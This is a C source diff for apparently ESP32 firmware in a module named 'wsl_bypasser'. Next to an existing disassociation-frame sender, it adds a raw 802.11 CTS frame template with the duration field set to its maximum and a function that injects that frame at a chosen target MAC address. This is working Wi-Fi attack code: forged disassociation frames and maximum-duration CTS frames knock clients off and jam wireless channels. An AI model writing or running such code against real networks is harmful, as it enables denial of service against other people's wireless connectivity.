@@ -97,6 +97,18 @@ static const uint8_t disassoc_frame_template[] = {
     0x08, 0x00                          /* Reason Code    */
 };
 
+/**
+ * Frame CTS (Clear To Send) (0xC4)
+ * [0-1]   Frame Control: 0xC4 0x00 (Control, Subtype=12 CTS)
+ * [2-3]   Duration: 0xFF 0x7F (Max 32767 µs)
+ * [4-9]   RA (Receiver Address): preenchido em runtime
+ */
+static const uint8_t cts_frame_template[] = {
+    0xc4, 0x00,                         /* Frame Control  */
+    0xff, 0x7f,                         /* Duration       */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* RA (Receiver Address) */
+};
+
 /* ─────────────────────────────────────────────────────────────────────────
  * FUNÇÕES INTERNAS
  * ───────────────────────────────────────────────────────────────────────── */
@@ -208,6 +220,17 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
     ESP_LOGD(TAG, "Disassoc broadcast → AP %02x:%02x:%02x:%02x:%02x:%02x",
              ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
              ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+
+    _tx_with_fallback(frame, sizeof(frame));
+}
+
+void wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
+    if (!target_mac) return;
+
+    uint8_t frame[sizeof(cts_frame_template)];
+    memcpy(frame, cts_frame_template, sizeof(cts_frame_template));
+
+    memcpy(&frame[4], target_mac, 6);
 
     _tx_with_fallback(frame, sizeof(frame));
 }
